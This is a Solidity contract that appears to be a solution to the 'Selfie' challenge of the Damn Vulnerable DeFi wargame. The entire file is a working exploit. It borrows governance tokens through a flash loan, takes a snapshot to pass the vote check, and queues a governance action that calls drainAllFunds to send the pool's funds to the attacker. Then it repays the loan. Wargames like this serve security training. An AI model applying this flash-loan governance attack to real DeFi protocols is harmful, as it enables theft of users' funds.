// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IDamnValuableToken {
    function transfer(address recipient, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);
}

interface IDamnValuableTokenSnapshot {

    function snapshot() external returns (uint256);

    function getBalanceAtLastSnapshot(address account) external view returns (uint256);

    function getTotalSupplyAtLastSnapshot() external view returns (uint256);
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
    function getActionDelay() external view returns (uint256);
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}


contract FlashLoanSelfie {
    using Address for address payable;

    address payable public attacker;
    address payable public token;
    address payable public governance;
    address payable public lenderPool;
    
    uint256 public actId;

    uint256 public testVal;

    constructor (address payable _attacker, address payable _token, address payable _governance, address payable _lenderPool) {
        attacker = _attacker;
        token = _token;
        governance = _governance;
        lenderPool = _lenderPool;
    }

    function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external {
        // Flash loan borrow
        
        // bypass _hasEnoughVotes
        //require(_borrowAmount >= 1000000 ether);
        //testVal = IDamnValuableToken(_tokenAddress).balanceOf(address(this));

        IDamnValuableTokenSnapshot(_tokenAddress).snapshot();

        actId = ISimpleGovernance(governance).queueAction(lenderPool, abi.encodeWithSignature("drainAllFunds(address)", attacker), 1);
        //ISimpleGovernance(governance).executeAction(actId);

        // Flash loan repayment : pay back to flash loan
        IDamnValuableToken(_tokenAddress).transfer(lenderPool, _borrowAmount);
    }

    function executeFlashLoans(uint256 _amount) external {
        ISelfiePool(lenderPool).flashLoan(_amount);
    }

    function check() external view returns (uint256) {
        return testVal;
    }

    receive() external payable {}
}